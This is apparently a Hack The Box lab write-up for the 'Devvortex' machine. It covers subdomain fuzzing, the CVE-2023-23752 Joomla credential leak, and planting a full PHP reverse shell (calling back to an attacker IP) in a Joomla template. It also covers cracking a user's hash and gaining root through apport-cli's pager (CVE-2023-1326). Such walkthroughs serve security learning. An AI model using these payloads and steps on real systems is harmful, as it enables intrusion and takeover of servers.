---
title:  "HTB Devvortex Writeup"
date:   2024-04-27 00:30:00 
categories: HTB Machine
tags: CVE-2023-1326 CVE-2023-23752 Joomla subdomain_enumeration GTFO_bin apport-cli
---



![Devvortex](/assets/img/Devvortex/F_okuOEWwAA61V0.png)

## Introduction

Devvortex was a nice and simple challenge focusing on the exploitation of a Vulnerable joomla service. The privesc required a little bit out of the box thinking as it wasn't the way to exploit it wasn't straight forward

If you like any of my content it would help a lot if you used my referral link to buy Hack the box/ Academy Subscriptions which you can find on my about page.

## Initial access
### Recon

To start our recon off we will start with an Nmap scan of the machine. using the following command
```
sudo nmap -sS -A  -o nmap  10.10.11.242
```
**Nmap**
```
# Nmap 7.94 scan initiated Mon Nov 27 14:16:28 2023 as: nmap -sS -A -o nmap 10.10.11.242
Nmap scan report for 10.10.11.242
Host is up (0.032s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=11/27%OT=22%CT=1%CU=36402%PV=Y%DS=2%DC=T%G=Y%TM=6564EB
OS:27%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST
OS:11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   23.55 ms 10.10.14.1
2   23.64 ms 10.10.11.242

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 27 14:16:55 2023 -- 1 IP address (1 host up) scanned in 26.82 seconds
```

Looking at the  main website it didn't look that interesting at first, it's a onepage website without any real info on it nor functionality to exploit.

![Main webpage](/assets/img/Devvortex/Devvortex_01.png)


My next step was to look for if there were any subdomains i might have missed.I was able to do this using the following wfuzz command. I used the **--hl** parameter to filter out all messages with a length of 7 because we are specifically looking for pages that had actual content and not a redirect. The wordlist i used is part of the DNS discovery directory of seclists.If you don't have it yet you can download it here: [Seclists](https://github.com/danielmiessler/SecLists)

```
sudo wfuzz -c -f sub-fighter -Z -w ./subdomains-top1million-5000.txt  -u http://devvortex.htb -H "Host: FUZZ.devvortex.htb"  --hl 7
```

This showed us that there was subdomain called **dev**

![wfuzz output](/assets/img/Devvortex/Devvortex_02.png)


On first sight this page looked the same however when doing some enumeration on the directories i noticed that the robots.txt which disclosed that **joomla** was being used.

![Joomla](/assets/img/Devvortex/Devvortex_03.png)

Seeing that the website is made with joomla my first thought was to run [joomscan](https://github.com/OWASP/joomscan). This tool will enumerate typical joomla files to figure out what version its using and maybe disclose other interesting info. Run joomscan as following:

```bash
perl joomscan.pl --url dev.devvortex.htb
```

Which tells us its running joomla version **Joomla 4.2.6**.


```

    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
			(1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://dev.devvortex.htb ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 4.2.6

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://dev.devvortex.htb/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://dev.devvortex.htb/robots.txt 

Interesting path found from robots.txt
http://dev.devvortex.htb/joomla/administrator/
http://dev.devvortex.htb/administrator/
http://dev.devvortex.htb/api/
http://dev.devvortex.htb/bin/
http://dev.devvortex.htb/cache/
http://dev.devvortex.htb/cli/
http://dev.devvortex.htb/components/
http://dev.devvortex.htb/includes/
http://dev.devvortex.htb/installation/
http://dev.devvortex.htb/language/
http://dev.devvortex.htb/layouts/
http://dev.devvortex.htb/libraries/
http://dev.devvortex.htb/logs/
http://dev.devvortex.htb/modules/
http://dev.devvortex.htb/plugins/
http://dev.devvortex.htb/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/dev.devvortex.htb/
```

### Exploiting Joomla

Version **Joomla 4.2.6** is vulnerable to the publicly known information disclosure exploit [cve-2023-23752](https://www.exploit-db.com/exploits/51334) The exploit code can be downloaded from [github](https://github.com/Acceis/exploit-CVE-2023-23752).

After getting the exploit code cd into it and install its dependencies with

```
sudo gem install httpx docopt paint
```

After installing the dependancies its possible to run the exploit to leak some sensitive data of the website  using joomla

```
ruby exploit.rb http://dev.devvortex.htb                      
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

When trying to use this password for SSH it didn't work so i tried to use these credentials on the web application. which did work.

![Joomla](/assets/img/Devvortex/Devvortex_04.png)


A classic way to get code execution execution in CMS platforms is by editing a template. I chose to edit the **offline.php** file from the **Cassiopeia** template. Follow the following url and you can edit this file.

```
http://dev.devvortex.htb/administrator/index.php?option=com_templates&view=template&id=223&file=L29mZmxpbmUucGhw&isMedia=0
```

Then i uploaded the php reverse shell from [Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Below the code i adjusted and uploaded.

```php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.194';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

```

![Php reverse shell](/assets/img/Devvortex/Devvortex_05.png)

Then next up we need to browse to the template file location to trigger our reverse shell. **http://dev.devvortex.htb/templates/cassiopeia/offline.php**.

Moments later our reverse shell would open.

![Shell connected](/assets/img/Devvortex/Devvortex_06.png)


### Lateral movement to Logan 

So we have access to **www-data** user now, but this user doesn't have much rights as far as i can see. But seeing we did get the credentials of the database user and password for the mysql server. First i listed all the tables using the following command. When prompted for a password i filled in **P4ntherg0t1n5r3c0n##**

```bash
mysql -u lewis -p joomla  -h 127.0.0.1 -e 'SHOW TABLES;'
```

This gave us the following tables where we could see the naming convention for the tables.

```
<snipped for brevity>
sd4fg_user_profiles
sd4fg_user_usergroup_map
sd4fg_usergroups
sd4fg_users
sd4fg_viewlevels
sd4fg_webauthn_credentials
sd4fg_workflow_associations
sd4fg_workflow_stages
sd4fg_workflow_transitions
sd4fg_workflows
```

next up i decided to extract the password hashes from the **sd4fg_users** table.

```bash
mysql -u lewis -p joomla  -h 127.0.0.1 -e 'select * from sd4fg_users;'
```

Which gave us the following output.

```
id	name	username	email	password	block	sendEmail	registerDate	lastvisitDate	activation	params	lastResetTime	resetCount	otpKey	otep	requireReset	authProvider
649	lewis	lewis	lewis@devvortex.htb	$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u	0	1	2023-09-25 16:44:24	2023-11-27 21:07:25	0		NULL	0			0	
650	logan paul	logan	logan@devvortex.htb	$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12	0	0	2023-09-26 19:15:42	NULL		{"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"}	NULL	0			0
```

This output had two hashes included. The hash for lewis we don't really need to try to crack since we already know his password. Add the hash of logan to a file.
```
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

Then run hashcat with the following parameters to crack this hash

```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

![Hash cracked](/assets/img/Devvortex/Devvortex_07.png)

So now that we know Logan's password is **tequieromucho**we can log in with it using ssh 

```
ssh logan@devvortex.htb
```

## Privilege escalation

When looking at what processes the user can run as sudo i noticed Logan was able to run **/usr/bin/apport-cli** with sudo.

```bash
sudo -l 
```
![Sudo -l](/assets/img/Devvortex/Devvortex_08.png)


Looking deeper into this I found out that **apport-cli** acts like less when doing something it wasn't inteded for. This means the [GTFOBIN](https://gtfobins.github.io/gtfobins/less/) entree of less would also be applicable. However when trying to run this it will say no pending crash reports. This means we need to force a crash report before we can actually try to abuse this.

for more info regarding this vulnerability check the [cve](https://nvd.nist.gov/vuln/detail/CVE-2023-1326)

We can force a crash by first starting a process in the background i'll make a process with sleep as this won't impact the system too much

```
sleep 100000 &\
```

This gave us the **PID 1978**

![Create sleep](/assets/img/Devvortex/Devvortex_09.png)

Next up we attack **apport-cli** to this process with the **--hanging** parameter.I used this parameter because sleep looks like a hanging process because its just seemingly stuck.

```
sudo /usr/bin/apport-cli -P 1978 --hanging
```
This opens the following window. Here we press the **V** button because this will open **Less** as sudo.

![Apport-cli window](/assets/img/Devvortex/Devvortex_10.png)

Then fill in !/bin/sh in the prompt below

```bash
!/bin/sh
```

![Apport-cli window](/assets/img/Devvortex/Devvortex_11.png)

After pressing enter you will be taken into a root shell

![Root shell](/assets/img/Devvortex/Devvortex_12.png)
